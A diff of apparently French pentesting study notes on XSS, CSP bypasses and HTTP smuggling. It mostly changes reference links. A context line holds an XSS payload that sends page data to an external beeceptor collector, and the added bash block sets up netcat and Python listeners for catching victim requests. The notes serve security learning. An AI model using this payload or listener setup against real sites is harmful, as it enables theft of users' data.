@@ -172,8 +172,8 @@ Voir aussi `elements`
  - https://excess-xss.com/
  - https://learn-cyber.net/article/Self-XSS-Attacks
  - https://learn-cyber.net/article/Reflected-XSS-Attacks
- - https://www.cobalt.io/blog/csp-and-bypasses
  - https://javascript.info/script-async-defer
+ - https://github.com/cure53/HTTPLeaks/tree/main
 
 `Protection`: HTML-encode les entrées utilisateurs, CSP
 
@@ -201,6 +201,18 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 
 [CSP Bypass](https://csplite.com/csp320/)
 
+- https://content-security-policy.com/
+- https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
+- https://www.cobalt.io/blog/csp-and-bypasses
+
+```bash
+# Requête complète, headers victime
+nc -nlvp 4444 
+
+# Serveurs (ngrok tcp)
+python -m http.server 4444
+python -m pyftpdlib -D
+```
 ### HTTP Smuggling
 
 - https://franso.re/fr/blog/http_rs_pour_les_nuls
